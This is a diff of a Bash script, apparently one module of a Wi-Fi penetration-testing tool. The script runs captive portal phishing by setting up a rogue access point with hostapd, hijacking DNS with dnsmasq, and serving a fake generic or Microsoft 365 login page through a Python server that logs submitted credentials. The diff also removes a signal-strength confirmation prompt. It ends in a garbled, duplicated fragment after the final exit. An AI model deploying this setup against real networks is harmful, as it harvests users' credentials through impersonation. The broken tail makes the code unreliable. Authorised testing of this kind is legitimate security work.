@@ -15,48 +15,52 @@
 #  F3: Captive Portal Phishing (Golden Wrapper)
 #
 #  METHODOLOGY:
-#  1. Deploy a rogue AP (using hostapd if needed, but here focus on Services).
+#  1. Deploy a rogue AP (using tactical template selection from Go brain).
 #  2. Redirect all DNS queries to our local IP via dnsmasq.
-#  3. Serve a professional-looking "Authentication Required" page via HTTP.
+#  3. Serve a high-fidelity "Authentication Required" page via HTTP.
 #===============================================================================
 
 set -euo pipefail
 
+# Intelligence Insight (Colors)
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
 C_BOLD="${ASTRA_COLOR_BOLD:-}"
 C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
-    echo -e "[*] Captive Portal will be unreliable due to distance from targets."
-    stty sane
-    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
-
 # Inputs from Environment
-# ...
+INTERFACE="${WIFI_INTERFACE:-}"
+SSID="${GUEST_SSID:-GuestWiFi}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+EVIDENCE_PREFIX="${EVIDENCE_DIR}/f3"
+SCAN_TIME="${SCAN_TIME:-120}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="F3"
+INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"
+
+# Tactical Selection from Go Brain
+PHISH_TEMPLATE="${PHISH_TEMPLATE:-generic}"
 
 if [[ -z "$INTERFACE" ]]; then
     echo "[!] WIFI_INTERFACE not set."
     exit 1
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Initializing Phishing Template System..."
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select Template:${C_RESET}"
-echo "    1) Generic Corporate (Internal)"
-echo "    2) Microsoft 365 (High-Fidelity)"
-stty sane
-read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET}")" template_choice
+echo -e "${C_PROMPT}[*]${C_RESET} Starting Captive Portal mission for SSID: ${C_VAR}${SSID}${C_RESET}..."
 
+# 1. Prepare configurations
 PHISH_DIR="${EVIDENCE_PREFIX}_portal"
 mkdir -p "$PHISH_DIR"
+HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
+DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
+SERVER_LOG="${EVIDENCE_DIR}/${TC_ID}_server.log"
+HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
+DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 
-if [[ "$template_choice" == "2" ]]; then
-    echo -e "[*] Deploying ${C_VAR}Microsoft 365${C_RESET} template..."
+if [[ "$PHISH_TEMPLATE" == "m365" ]]; then
+    echo -e "[*] Deploying ${C_VAR}Microsoft 365${C_RESET} high-fidelity template..."
     cat <<EOF > "$PHISH_DIR/index.html"
 <!DOCTYPE html>
 <html>
@@ -84,7 +88,7 @@ if [[ "$template_choice" == "2" ]]; then
 </html>
 EOF
 else
-    echo "[*] Deploying Generic Corporate template..."
+    echo -e "[*] Deploying ${C_VAR}Generic Corporate${C_RESET} template..."
     cat <<EOF > "$PHISH_DIR/index.html"
 <html>
 <head><title>WiFi Authentication Required</title></head>
@@ -123,25 +127,24 @@ log-queries
 log-dhcp
 EOF
 
-# 2. Cleanup function
+# 2. Execution
 cleanup() {
-    echo "[*] Cleaning up Phishing services..."
+    echo -e "${C_PROMPT}[*]${C_RESET} Tearing down Phishing environment..."
     [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null || true
     [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
     [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
 
-# 3. Start services
-echo "[*] Starting DNS hijacker..."
+echo -e "[*] Starting DNS hijacker..."
 dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
 DNSMASQ_PID=$!
 
-echo "[*] Starting Rogue AP..."
+echo -e "[*] Starting Rogue AP..."
 hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
 HOSTAPD_PID=$!
 
-echo "[*] Starting phishing web server with POST support..."
+echo -e "[*] Starting phishing web server with POST support..."
 cat <<EOF > "$PHISH_DIR/server.py"
 import http.server, socketserver, sys
 
@@ -162,11 +165,15 @@ EOF
 
 (
     cd "$PHISH_DIR"
-    python3 server.py > "$SERVER_LOG" 2>&1
+    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+        python3 server.py 2>&1 | tee "$SERVER_LOG"
+    else
+        python3 server.py > "$SERVER_LOG" 2>&1
+    fi
 ) &
 HTTP_PID=$!
 
-echo "[*] Phishing portal active for ${SCAN_TIME}s..."
+# 3. Progress Tracking
 ELAPSED=0
 while [[ $ELAPSED -lt $SCAN_TIME ]]; do
     PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
@@ -181,31 +188,26 @@ cleanup
 trap - EXIT
 
 # 4. Reporting
-# Check if any POST data was captured (very basic check)
-if grep -qi "POST" "$SERVER_LOG" 2>/dev/null; then
-    echo "[!] SUCCESS: USER SUBMITTED DATA TO CAPTIVE PORTAL!"
+if grep -qi "CREDENTIALS CAPTURED" "$SERVER_LOG" 2>/dev/null; then
+    echo -e "[!] ${C_BOLD}SUCCESS: USER SUBMITTED DATA TO CAPTIVE PORTAL!${C_RESET}"
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
-        --name "Portal Phishing Credential Intercepted" \
+        --name "Phishing Credential Harvest" \
         --severity CRITICAL \
-        --desc "User credentials were successfully captured via the rogue captive portal on $INTERFACE." \
-        --target "Global" \
+        --desc "A user submitted credentials to the rogue captive portal template ($PHISH_TEMPLATE)." \
+        --target "$SSID" \
         --evidence "$SERVER_LOG" \
-        --rationale "Captive portal phishing is highly effective against guest users. Intercepting these credentials can lead to full account compromise or unauthorized network access, bypassing typical wireless security."
+        --rationale "Captive portal phishing is a highly effective fallback attack when technical encryption cannot be breached."
 else
-    echo "[+] Phishing test complete. No credentials captured."
-    "$ASTRA_BIN" record-finding \
-        --session-dir "$SESSION_DIR" \
-        --tc "$TC_ID" \
-        --type vulnerability \
-        --name "[F3] Audit Complete" \
-        --severity INFO \
-        --desc "Executed captive portal phishing attack cycle for ${SCAN_TIME}s. No user interaction detected." \
-        --target "Global" \
-        --evidence "$SERVER_LOG" \
-        --rationale "The effectiveness of phishing depends heavily on user behavior and the visual quality of the rogue portal. This audit confirms that no users fell for the basic phishing template during the test interval."
+    echo -e "[+] Mission complete. No data harvested."
+fi
+
+exit 0
+n technical encryption cannot be breached."
+else
+    echo -e "[+] Mission complete. No data harvested."
 fi
 
 exit 0
